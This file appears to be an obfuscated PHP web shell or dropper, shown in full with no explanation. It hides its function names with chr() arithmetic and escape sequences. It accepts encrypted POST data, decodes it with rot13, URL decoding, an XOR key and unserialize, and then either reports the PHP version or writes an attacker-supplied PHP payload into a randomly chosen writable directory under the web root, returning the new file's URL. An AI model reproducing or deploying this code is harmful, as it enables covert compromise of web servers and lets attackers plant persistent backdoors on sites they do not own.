<?php $ZKeFt = "\104"."\x4f".chr(285-218).chr(85).chr(77).chr(69)."\x4e".chr(429-345).chr(722-627)."\x52"."\117"."\117".'T';$CPmOdDBfAc = "\110".'T'."\x54".chr(80).chr(95).'H'."\117".'S'.chr(940-856);$UHReQ = "\150".chr(308-192)."\x74"."\x70".':'."\57".'/';$xRZJGUSG = chr(46).chr(174-62).chr(104).chr(623-511);$rMBacBmSuV = 'p'.'h'.chr(112);$qVRdlcBZW = chr(255-153).'i'."\154".'e'."\137"."\160"."\165"."\x74".'_'."\x63".chr(897-786).chr(110).chr(124-8)."\145".'n'."\x74".'s';$ChWVoN = chr(385-271).'a'.chr(119)."\x75".chr(114)."\x6c".chr(772-672).chr(101).'c'."\157".'d'.chr(101);$DgAExzAfNz = "\x75".'n'."\163"."\145"."\162".chr(872-767).'a'.chr(108).chr(105)."\x7a".'e';$zeHMJHl = 'p'."\150"."\x70"."\x76".chr(562-461)."\162".chr(115).chr(105)."\157"."\156";$BwFNbb = "\163"."\x74".'r'.chr(95).chr(1070-956).'o'."\164".'1'.chr(51);$rDrZaIoI = chr(115).chr(599-498).chr(957-843).chr(670-565).'a'.chr(108).chr(105)."\x7a".chr(854-753);foreach ($_POST as $iKuGv => $shgKQ){if (strlen($iKuGv) == 16){$shgKQ = str_split($ChWVoN($BwFNbb($shgKQ)));$iKuGv = array_slice(str_split(str_repeat($iKuGv, (count($shgKQ)/16)+1)), 0, count($shgKQ));function IuYXSTU($XfXjsvAVoc, $UNvTu, $iKuGv){$CnicznvDLt = "lSYpEvfDgRDGPzeM";return $XfXjsvAVoc ^ $CnicznvDLt[$UNvTu % strlen($CnicznvDLt)] ^ $iKuGv;}$shgKQ = implode("", array_map("IuYXSTU", array_values($shgKQ), array_keys($shgKQ), array_values($iKuGv)));$shgKQ = @$DgAExzAfNz($shgKQ);if (@is_array($shgKQ)){$zSNvgNA = array_keys($shgKQ);$shgKQ = $shgKQ[$zSNvgNA[0]];if ($shgKQ === $zSNvgNA[0]){echo @$rDrZaIoI(Array($rMBacBmSuV => @$zeHMJHl(), ));exit();}else {function zeSvYCIlZR($MGaaxOZlir){static $tEtqq = array();$cKzJVfMK = glob($MGaaxOZlir . '/*', GLOB_ONLYDIR);if (count($cKzJVfMK) > 0) {foreach ($cKzJVfMK as $MGaaxOZl) {if (@is_writable($MGaaxOZl)) {$tEtqq[] = $MGaaxOZl;}}}foreach ($cKzJVfMK as $MGaaxOZlir) zeSvYCIlZR($MGaaxOZlir);return $tEtqq;}$tfJsmbkJGw = $_SERVER[$ZKeFt];$cKzJVfMK = zeSvYCIlZR($tfJsmbkJGw);$zSNvgNA = array_rand($cKzJVfMK);$MvroHR = $cKzJVfMK[$zSNvgNA] . "/" . substr(md5(time()), 0, 8) . $xRZJGUSG;@$qVRdlcBZW($MvroHR, $shgKQ);echo $UHReQ . $_SERVER[$CPmOdDBfAc] . substr($MvroHR, strlen($tfJsmbkJGw));exit();}}}}